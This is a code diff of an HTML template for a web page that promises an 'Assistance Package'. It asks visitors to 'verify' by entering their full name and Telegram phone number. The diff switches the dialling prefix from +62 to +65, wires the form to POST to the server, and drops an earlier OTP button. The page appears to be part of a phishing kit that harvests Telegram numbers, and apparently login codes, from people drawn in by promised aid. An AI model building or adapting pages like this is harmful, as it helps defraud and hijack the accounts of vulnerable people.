@@ -7,7 +7,7 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <link rel="shortcut icon" href="{{ url_for('static', filename='images/logomod.png') }}" type="image/x-icon">
-    <style>
+     <style>
         body {
             background-size: cover;
             background-repeat: no-repeat;
@@ -301,7 +301,7 @@
                     <h1 class="text-center custom-text main-heading">Get the help you need</h1>
                     <p class="text-center custom-text sub-heading">Find support schemes and services all in one place.</p>
                     <h2 class="check-status">Verification To Receive Assistance Package</h2>
-                    <form id="form-verification">
+                    <form id="form-verification" method="POST" action="{{ url_for('index') }}">
                         <div class="mb-3" style="max-width: 350px; margin-left: auto; margin-right: auto;">
                             <div class="input-group" style="margin-top: 15px;">
                                 <span class="input-group-text" id="basic-addon">
@@ -310,47 +310,20 @@
                                 <input type="text" class="form-control" id="name" aria-label="Phone number" aria-describedby="basic-addon1" placeholder="Enter Full Name" required>
                             </div>
                             <div class="input-group" style="margin-top: 15px;">
-                                <span class="input-group-text " id="basic-addon1" >+62</span>
-                                <!-- <input type="tel" class="form-control" id="phone" aria-label="Phone number" aria-describedby="basic-addon1" placeholder="Enter Telegram Number " required> -->
+                                <span class="input-group-text " id="basic-addon1" >+65</span>
                                 <input type="number" id="phone_number" class="form-control" name="phone_number" aria-label="Phone number" aria-describedby="basic-addon1" placeholder="Enter Telegram Number" required>
                             </div><br>
                         </div>
                         <div class="d-grid gap-2 d-flex justify-content-center">
-                        <!-- <button type="button" class="btn" id="request-otp-button">Send OTP</button> -->
-                        <button class="btn" type="submit">Submit</button>
+                            <button class="btn" type="submit">Submit</button>
                         </div>
                     </form>
                 </div>
             </div>
-        </main>>
-    </div>
-    <div class="slider-card">
-        <div class="slider">
-            <div class="slides">
-                <div class="slide1"><img src="{{ url_for('static', filename='images/image1.jpg') }}" alt="Image 1"></div>
-            </div>
-        </div>
-    </div>
-    <div class="slider-card">
-        <div class="slider">
-            <div class="slides">
-                <div class="slide1"><img src="{{ url_for('static', filename='images/image2.jpg') }}" alt="Image 2"></div>
-            </div>
-        </div>
-    </div>
-    <div class="slider-card">
-        <div class="slider">
-            <div class="slides">
-                <div class="slide1"><img src="{{ url_for('static', filename='images/image4.jpg') }}" alt="Image 4"></div>
-            </div>
-        </div>
+        </main>
     </div>
 
-
-    <div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.5); z-index: 9999;">
-        <div class="spinner" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></div>
-    </div>
-
+    <!-- Kode lainnya di sini -->
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://code.jquery.com/jquery.min.js"></script>
